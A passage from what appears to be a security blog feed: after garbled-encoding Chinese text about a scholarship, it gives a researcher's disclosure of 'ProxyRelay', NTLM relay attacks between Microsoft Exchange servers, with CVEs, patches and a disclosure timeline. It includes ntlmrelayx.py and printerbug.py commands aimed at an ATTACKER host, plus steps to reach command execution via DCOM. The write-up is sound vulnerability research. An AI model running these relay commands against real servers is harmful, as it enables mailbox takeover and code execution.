&lt;p&gt;æ­¤æ¬¡ç²çåŒå­¸éä½ˆå…¨å°ï¼Œåˆ†åˆ¥ä¾†è‡ªåŸºéš†å•†å·¥è³‡è¨Šç§‘ã€å°ç£å¸«ç¯„å¤§å­¸è³‡è¨Šå·¥ç¨‹ç³»ã€é™½æ˜äº¤é€šå¤§å­¸è³‡è¨Šç§‘å­¸èˆ‡å·¥ç¨‹ç ”ç©¶æ‰€åŠè³‡é›»äº¥å®¢èˆ‡å®‰å…¨å­¸ç¨‹ã€æ¸…è¯å¤§å­¸è³‡è¨Šå®‰å…¨ç ”ç©¶æ‰€ã€é€¢ç”²å¤§å­¸è³‡è¨Šå·¥ç¨‹ç³»ã€å°ä¸­ç§‘æŠ€å¤§å­¸è³‡è¨Šç®¡ç†ç³»ã€å—å°ç§‘æŠ€â¼¤å­¸è³‡è¨Šå·¥ç¨‹ç³»ç­‰ã€‚ç²çåŒå­¸çš†å°‡ç²çè¦–ç‚ºé‡è¦è‚¯å®šï¼Œä¹Ÿè¡¨ç¤ºå¸Œæœ›æŒçºŒç²¾é€²è‡ªå·±ï¼Œä¸¦å°‡ç¶“é©—åˆ†äº«çµ¦ä»–äººã€å›é¥‹ç¤¾æœƒï¼Œå…¶ä¸­ä¹Ÿæœ‰å¥½å¹¾ä½åŒå­¸å¸Œæœ›æœªä¾†èƒ½åŠ å…¥ DEVCOREã€‚&lt;/p&gt;

&lt;p&gt;ã€Œç•¶æ™‚å—åˆ° DEVCORE å¹«åŠ©ï¼Œæˆ‘èªªæœªä¾†ä¸€å®šæ‰¾æ©Ÿæœƒå¥½å¥½æ„Ÿè¬ DEVCOREã€‚ä½† DEVCORE å›æ‡‰ã€åªè¦æŠŠé€™ä»½æ„Ÿè¬çš„å¿ƒæƒ…ï¼Œæ‹¿å»å¹«åŠ©å…¶ä»–äººï¼Œå°±æ˜¯æœ€å¥½çš„å›å ±ã€ï¼Œå› ç‚ºé€™å¥è©±ï¼Œæˆ‘å¯«äº†ä¸€äº›æ–‡ç« ï¼Œå¸Œæœ›èƒ½å¹«åŠ©åˆ°å…¶ä»–äººã€‚åœ¨æœªä¾†ï¼Œæˆ‘ä¹Ÿæœƒç¹¼çºŒå¹«åŠ©å…¶ä»–äººï¼Œä»¥æ­¤ä¾†å›å ±è²´å…¬å¸åœ¨è³‡å®‰ç•Œç„¡ç§çš„å¥‰ç»ã€‚ã€æ¸…å¤§è˜‡åŒå­¸èªªã€‚&lt;/p&gt;

&lt;p&gt;é™½æ˜äº¤é€šå¤§å­¸é«˜åŒå­¸å‰‡è¡¨ç¤ºï¼Œå°‡é‹ç”¨é€™ç­†çå­¸é‡‘è³¼è²·åŸæœ¬è² æ“”ä¸èµ·çš„æ˜‚è²´ç‰©è¯ç¶²è¨­å‚™åŠç›¸é—œå·¥å…·ï¼Œä»¥åˆ©é€²è¡Œè³‡å®‰ç›¸é—œç ”ç©¶ï¼Œä¹Ÿå°‡è³¼å…¥è³‡è¨Šç›¸é—œæ›¸ç±ï¼Œæå‡è‡ªå·±çš„çŸ¥è­˜ã€‚&lt;/p&gt;

&lt;p&gt;æœŸå¾…ç²çåŒå­¸å€‘æœªä¾†æŒçºŒæ·±è€•è³‡å®‰çŸ¥è­˜èˆ‡æŠ€è¡“ï¼Œåœ¨è³‡å®‰èˆå°ä¸Šç™¼å…‰ç™¼ç†±ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/12/23/2022-devcore-national-cyber-security-scholarship-results-announcement/</link>
                <guid>https://devco.re/blog/2022/12/23/2022-devcore-national-cyber-security-scholarship-results-announcement</guid>
                <pubDate>Fri, 23 Dec 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 4 - ProxyRelay!</title>
                <description>&lt;p&gt;Hi, this is a long-time-pending article. We could have published this article earlier (the original bug was reported to MSRC in June 2021 with a 90-days Public Disclosure Policy). However, during communications with MSRC, they explained that since this is an architectural design issue, lots of code changes and testings are expected and required, so they hope to resolve this problem with a one-time CU (Cumulative Update) instead of the regular Patch Tuesday. We understand their situation and agree to extend the deadline.&lt;/p&gt;

&lt;p&gt;Microsoft eventually released &lt;a href=&quot;https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8&quot;&gt;Exchange Server 2019 CU 12&lt;/a&gt; and &lt;a href=&quot;https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678&quot;&gt;Exchange Server 2016 CU 23&lt;/a&gt; on April 20, 2022. However, &lt;strong&gt;this patch did not enable by default&lt;/strong&gt;. Microsoft didnâ€™t release the patch-activating methods until August 09, 2022. So, we originally had the opportunity to demonstrate our attack at &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2022/1/12/pwn2own-vancouver-2022-luanch&quot;&gt;Pwn2Own Vancouver 2021&lt;/a&gt;. However, we dropped the idea quickly because our intention is not to earn bounties. We are here to &lt;a href=&quot;https://devco.re/en/about/&quot;&gt;secure the world&lt;/a&gt;! You can check the &lt;a href=&quot;#Timeline&quot;&gt;Timeline&lt;/a&gt; to know the detailed disclosure process.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;idea&quot;&gt;Idea&lt;/h1&gt;

&lt;p&gt;Since Microsoft blocked our Proxy-Related attacks in April 2021, I have been thinking about whether there is a way to bypass the mitigation. During that April patch, Microsoft enhanced the authentication part of CAS Frontend by requiring all HTTP requests that need a Kerberos Ticket to be authenticated first. This enhancement effectively mitigated the attack surface we proposed and stopped unauthenticated HTTP requests accessing the CAS Backend. So Exchange is safe now?&lt;/p&gt;

&lt;p&gt;Of course not, and this article is to prove this! Since Microsoft only fixes the problematic code, we proposed several attacks and possible weaknesses in our &lt;a href=&quot;https://powerofcommunity.net/2021.htm&quot;&gt;POC 2021&lt;/a&gt; and &lt;a href=&quot;https://hitcon.org/2021/agenda/279d7810-e619-4dc3-9113-b11bad5277ec/&quot;&gt;HITCON 2021&lt;/a&gt; talks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20221019/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Maybe you have heard that our first prediction has already been made in recent &lt;a href=&quot;https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9&quot;&gt;ProxyNotShell&lt;/a&gt;. The attack reuses the path confusion of ProxyShell but attaches a pre-known authentication instead. Itâ€™s solid but it looks it still needs a valid authentication (not sure, still havenâ€™t time to dig into). However, we hinted there is another way not to fight with the auth-enhancement face-to-face during my talks. Now we can finally disclose it :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Just in case you donâ€™t know, I am a big fan of &lt;a href=&quot;https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn&quot;&gt;Printer Bug&lt;/a&gt; (kudos to &lt;a href=&quot;https://twitter.com/tifkin_&quot;&gt;Lee Christensen&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;Will Schroeder&lt;/a&gt;, and &lt;a href=&quot;https://twitter.com/enigma0x3&quot;&gt;Matt Nelson&lt;/a&gt; for their amazing talk at &lt;a href=&quot;https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory&quot;&gt;DerbyCon 2018&lt;/a&gt;). PrinterBug allows an attacker to coerce any domain-joined machine to initiate an SMB connection with its own Machine Account to the attacker via &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1&quot;&gt;MS-RPRN&lt;/a&gt; protocol. Because this behavior works as designed, this hacker-friendly feature has been extensively used for NTLM relaying for years.&lt;/p&gt;

&lt;p&gt;In the architecture of Exchange CAS, Backend authorizes an HTTP request to have the ability to impersonate any user by checking whether the login identity has the Extended Right of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ms-Exch-EPI-Token-Serialization&lt;/code&gt; or not. Also, during the Exchange Server installation, the mailbox server will be added to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Servers group&lt;/code&gt; automatically, and all objects in this Active Directory group have that Token-Serialization right by default.&lt;/p&gt;

&lt;p&gt;With the prior knowledge in mind, I come up with a simple idea. Itâ€™s common to see multiple Exchange Servers in corporate networks for high availability and site resilience. &lt;strong&gt;Can we relay the NTLM authentication among Exchange Servers?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There are several pros to this relay idea. Since itâ€™s a cross-machine relay, it wonâ€™t be limited by the same-host restriction. Also, because the NTLM authentication is initiated by the Machine Account of Exchange Server, the relayed authentication owns the Token-Serialization right that allows us to impersonate any user in Exchange services. I believe this is a fantastic idea and would like to explore if it is exploitable!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. This attack surface was also found and reported to MSRC independently by &lt;a href=&quot;https://twitter.com/D1iv3&quot;&gt;Dlive&lt;/a&gt; from Tencent Xuanwu Lab, so you can see we share most of the CVE acknowledgments.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;Letâ€™s talk about the vulnerabilities. Since itâ€™s an entire attack surface instead of a single bug, this idea could be applied to different contexts, causing different vulnerabilities. The impact of these vulnerabilities is that an attacker can bypass Exchange authentications or even get code execution without user-interaction. Here are the related CVEs so far:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt; - Relay to Exchange FrontEnd&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979&quot;&gt;CVE-2022-21979&lt;/a&gt; - Relay to Exchange BackEnd&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414&quot;&gt;CVE-2021-26414&lt;/a&gt; - Relay to Windows DCOM&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-RESERVED&quot;&gt;CVE-2022-RESERVED&lt;/a&gt; - Relay to other services of Exchange&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following attacks have the similar template, the host &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; stands for the first Exchange Server, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; for the second Exchange Server, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; for the attacker-controlled server.&lt;/p&gt;

&lt;p&gt;In all attacks, the attacker coerces the first Exchange Server to initiate an NTLM authentication to him, and relay it to the second Exchange Server. We use &lt;a href=&quot;https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py&quot;&gt;printerbug.py&lt;/a&gt; to coerce a server to initiate an SMB connection and use &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py&quot;&gt;ntlmrelayx.py&lt;/a&gt; to catch the NTLM and relay the authentication to another Exchange Server.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-1---relay-to-exchange-frontend&quot;&gt;Round 1 - Relay to Exchange FrontEnd&lt;/h2&gt;

&lt;p&gt;For the first context, we try to relay the authentication to another Frontend of Exchange Server. Since the identity of the relayed authentication is Exchangeâ€™s Machine Account which owns the Token-Serialization right, we can impersonate any user! Here we relay the NTLM authentication from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;â€™s Frontend EWS service as the showcase. We implement the relay-to-frontend-EWS attack by customizing the &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py&quot;&gt;httpattack.py&lt;/a&gt;! Here is a simple overview:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntlmrelayx.py&lt;/code&gt; on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; server to wait for NTLM authentications.&lt;/li&gt;
  &lt;li&gt;Use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printerbug.py&lt;/code&gt; to coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to initiate an SMB connection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Receive the SMB connection on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; and relay the NTLM blobs to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Complete the NTLM handshakes to get full access to the EWS endpoint.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Terminal 1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python ntlmrelayx.py &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; https://EX02/EWS/Exchange.asmx

&lt;span class=&quot;c&quot;&gt;# Terminal 2&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python printerbug.py EX01 ATTACKER
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Theoretically, we can take over the target mailbox by &lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange&quot;&gt;EWS operations&lt;/a&gt;. Here we give a demo to dump the secret under administratorâ€™s mailbox.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/IFRvmo6AZoY&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h3 id=&quot;patching-frontend&quot;&gt;Patching FrontEnd&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt; and released a patch to fix that Frontend is relay-able in July 2021. Since logging in as Machine Account in Frontend isnâ€™t a regular operation, itâ€™s easy to mitigate the attack by adding a check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsSystemOrMachineAccount()&lt;/code&gt; on the Frontend Proxy-Handler to ensure all Frontend logons are not Machine Account.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-2---relay-to-exchange-backend&quot;&gt;Round 2 - Relay to Exchange BackEnd&lt;/h2&gt;

&lt;p&gt;Relaying to Frontend can be easily mitigated by a simple check. How about relaying to Backend? Since Backend verifies the Frontend requests by checking whether itâ€™s a Machine Account or not, mitigating Backend would be more challenging because itâ€™s a regular operation and Backend needs the Machine Account that hash the extended right of ms-Exch-EPI-Token-Serialization to impersonate to the desired user. Here we provide 3 showcases against attacking Backend.&lt;/p&gt;

&lt;h3 id=&quot;2-1-attacking-backend-ews&quot;&gt;2-1 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/EWS&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;Based on the relay-to-frontend EWS attack we introduced, the earlier attack can be re-applied to Backend seamlessly. The only change is to modify the target port from 443 to 444.&lt;/p&gt;

&lt;h3 id=&quot;2-2-attacking-backend-rpc&quot;&gt;2-2 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/RPC&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;The other showcase is attacking &lt;a href=&quot;https://learn.microsoft.com/en-us/exchange/outlook-anywhere-exchange-2013-help&quot;&gt;Outlook Anywhere&lt;/a&gt;. Exchange defines several internal RPC services that can directly operate the mailbox. Those RPC services have a public interface and can be access through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/*&lt;/code&gt;, and users can access their own mailbox via RPC-over-HTTP protocol, which is described in Microsoftâ€™s &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpch/c0f4c9c5-1a61-4d10-b8e2-005378d1d212&quot;&gt;MS-RPCH&lt;/a&gt; specification. For those who want to understand the underlying mechanism, itâ€™s recommended to read the awesome research &lt;a href=&quot;https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/&quot;&gt;Attacking MS Exchange Web Interfaces&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_mohemiv&quot;&gt;Arseniy Sharoglazov&lt;/a&gt; for details.&lt;/p&gt;

&lt;p&gt;Back to our attack, the core logic is as same as attacking EWS. Because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/*&lt;/code&gt; is also located at HTTP/HTTPS, itâ€™s also relay-able. Once we bypass the authentication and access the route &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/RpcProxy.dll&lt;/code&gt;, we can impersonate as any user and operate his mailbox through the RPC-over-HTTP protocol. To implement the attack, we have ported lots of the &lt;a href=&quot;https://github.com/sensepost/ruler&quot;&gt;Ruler Project&lt;/a&gt; to &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt;. As the result of this showcase, we can bypass the authentication by PrinterBug and operates any userâ€™s mailbox through Outlook Anywhere. The entire attack can be illustrated as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Establish &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCP_IN_DATA&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCP_OUT_DATA&lt;/code&gt;  channels to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; for RPC I/O.&lt;/li&gt;
  &lt;li&gt;Trigger PrinterBug on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; and relay to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; to complete NTLM handshakes.&lt;/li&gt;
  &lt;li&gt;Attach &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; headers to indicate we are Exchange Admin on both HTTP headers.&lt;/li&gt;
  &lt;li&gt;Interact with the Outlook Anywhere by lots of the coding works upon &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a&quot;&gt;MS-OXCRPC&lt;/a&gt; and &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrops/13af6911-27e5-4aa0-bb75-637b02d4f2ef&quot;&gt;MS-OXCROPS&lt;/a&gt; over MS-RPCHâ€¦&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;2-3-attacking-backend-powershell&quot;&gt;2-3 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/PowerShell&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;The last showcase we would like to highlight is relaying to Exchange PowerShell. Since we have bypassed the authentication on Backend IIS, itâ€™s possible to perform a &lt;a href=&quot;https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html&quot;&gt;ProxyShell-Like&lt;/a&gt; exploit again! Once we can execute arbitrary Exchange Cmdlets, it shouldnâ€™t be hard to find a Post-Auth RCE to chain together because we are Exchange Admin. There are hundreds of Cmdlets for the purpose of Exchange Management, and many past cases (&lt;a href=&quot;https://srcincite.io/advisories/src-2020-0019/&quot;&gt;CVE-2020-16875&lt;/a&gt;, &lt;a href=&quot;https://srcincite.io/advisories/src-2020-0025/&quot;&gt;CVE-2020-17083&lt;/a&gt;, &lt;a href=&quot;https://x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/&quot;&gt;CVE-2020-17132&lt;/a&gt;, &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell&quot;&gt;CVE-2021-31207&lt;/a&gt; and more) have proven that this is not a difficult task, too.&lt;/p&gt;

&lt;p&gt;Since we decided not to participate in Pwn2Own, we did not implement this exploit chain. Here we leave this as an exercise for our readers. ;)&lt;/p&gt;

&lt;h3 id=&quot;2-4-patching-backend&quot;&gt;2-4 Patching BackEnd&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979&quot;&gt;CVE-2022-21979&lt;/a&gt; and patch that in August 2022. This patch permanently eliminates all relay attacks on Backend by forcibly turning on the &lt;a href=&quot;https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/&quot;&gt;Extended Protection Authentication&lt;/a&gt; in IIS.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-3---relay-to-windows-dcom&quot;&gt;Round 3 - Relay to Windows DCOM&lt;/h2&gt;

&lt;p&gt;This part should be all credited to &lt;a href=&quot;https://twitter.com/D1iv3&quot;&gt;Dlive&lt;/a&gt;. The industry knows MS-DCOM is relay-able since &lt;a href=&quot;https://twitter.com/sploutchy&quot;&gt;Sylvain Heiniger&lt;/a&gt;â€™s awesome &lt;a href=&quot;https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/&quot;&gt;Relaying NTLM authentication over RPC&lt;/a&gt; research for long. However, Dlive creates an RCE-chain based on the group inheritance of Exchange Servers in Active Directory environments. Please shout out to him!&lt;/p&gt;

&lt;p&gt;The idea of this attack is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local Administrators&lt;/code&gt; group of Exchange Server includes the group member &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Trusted Subsystem&lt;/code&gt;, and all Exchange Server are in this group by default. That means the Machine Account &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01$&lt;/code&gt; is also the local administrator of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;. With this concept in mind, the impact of relay-to-MS-DCOM can be maximized and perfectly applied to Exchange Server now!&lt;/p&gt;

&lt;p&gt;Dlive has demonstrated this attack in his &lt;a href=&quot;https://www.youtube.com/watch?v=7h38rI8KT30&quot;&gt;DEFCON 29 talk&lt;/a&gt;. Although he didnâ€™t publish the exploit code, the Wireshark screenshot in his &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf?page=45&quot;&gt;slides&lt;/a&gt;&lt;sup&gt;p45&lt;/sup&gt; has already hinted everything and is enough to reproduce. The process could be illustrated as the following:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to initiate a connection, and relay the NTLM to the Endpoint Mapper (port 135) of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; to get the Interface of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MMC20.Application&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; again, and relay the NTLM to the dynamic port allocated by the EPMapper, and call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExecuteShellCommand(...)&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iMMC-&amp;gt;Document-&amp;gt;ActiveView&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Run arbitrary commands for fun and profit!&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Writing the whole exploit is fun, just like mixing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dcomexec.py&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntlmrelayx.py&lt;/code&gt; together. Itâ€™s recommended to write your own exploit code by hand for those who want to understand the DCOM mechanism more!&lt;/p&gt;

&lt;h3 id=&quot;patching-dcom&quot;&gt;Patching DCOM&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414&quot;&gt;CVE-2021-26414&lt;/a&gt; and patch this DCOM-relay in June 2021. However, due to compatibility, &lt;strong&gt;the hardening on the server-side is disabled by default&lt;/strong&gt;. Server Admin has to manually activate the patch by creating the following registry key. If Server Admin didnâ€™t read the documentation carefully, his Exchange Server is probably still vulnerable after the June patch.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole\AppCompat\RequireIntegrityActivationAuthenticationLevel&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As for when will the protection be enforced on server side? According to the FAQ under the CVE page, Microsoft has addressed a three-phase rollout to fully mitigate this issue. Now, itâ€™s on phase one, and the patch wonâ€™t be activated by default until June 14, 2022. So, at the time of this writing, this RCE is still exploitable on the latest version of Exchange Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Microsoft hash announce the second phase and enabled the hardening on the server-side by default on June 14, 2022. Exchange Server that installed the latest Windows patch should be safe now&lt;/em&gt;
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-4---relay-to-other-exchange-services&quot;&gt;Round 4 - Relay to Other Exchange Servicesâ€¦&lt;/h2&gt;

&lt;p&gt;Services that use NTLM as their authentication method on Exchange Server might be vulnerable, too. At the time of this writing, we have already found and reported one to MSRC. We believe there should be more, and this is a good target for those who want to discover vulnerabilities on Exchange Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;closing&quot;&gt;Closing&lt;/h1&gt;

&lt;p&gt;Here, this series has finally come to an end. Over the past two years, many ups and downs made this journey unusual. From the earliest bug collision with the bad actor, ITW panic, to the Pwn2Own hacking competition, and our talks got acceptance at top-level hacker conferences, we have a clear conscience that we didnâ€™t do anything wrong. However, without understanding the context, there were lots of incorrect speculations and inaccurate media reports toward our company and me; there were even low blows to usâ€¦ that sucks.&lt;/p&gt;

&lt;p&gt;Although there were also happy moments, such as winning our first Master-of-Pwn champion at the top-hacking competition Pwn2Own and got the Best Server-Side bug of Pwnie Awards, the gossip and troll really harassed and depressed me a lotâ€¦&lt;/p&gt;

&lt;p&gt;Congratulate that I can finally close this research and start my new hacking. I am nothing but a security nerd who would rather spend more time on hacks, and please donâ€™t blame me if my sentences are sometimes short and unclear; itâ€™s not easy to express things in an unfamiliar language. It took me about 4x~5x times to arrange a presentation or article in a non-native language; lots of words were lost during refining.&lt;/p&gt;

&lt;p&gt;Hope that one day, there will be no language barrier. In a bar, with beers, we can talk about hacks, the culture, and hacking all night!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Jun 02, 2021&lt;/strong&gt; - We reported the vulnerability to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 03, 2021&lt;/strong&gt; - MSRC opened the case. (No. 65594)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 03, 2021&lt;/strong&gt; - We attached a 90-days Vulnerability Disclosure Policy to MSRC. The deadline is &lt;strong&gt;Sep 01, 2021&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jun 11, 2021&lt;/strong&gt; - MSRC replied that they are aiming to complete it before September.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 22, 2021&lt;/strong&gt; - MSRC said the case doesnâ€™t look like it will be fully resolved by September.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jul 25, 2021&lt;/strong&gt; - We said we could extend the deadline and let us know the new estimated date.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Aug 25, 2021&lt;/strong&gt; - We asked for the estimated date again.&lt;/li&gt;
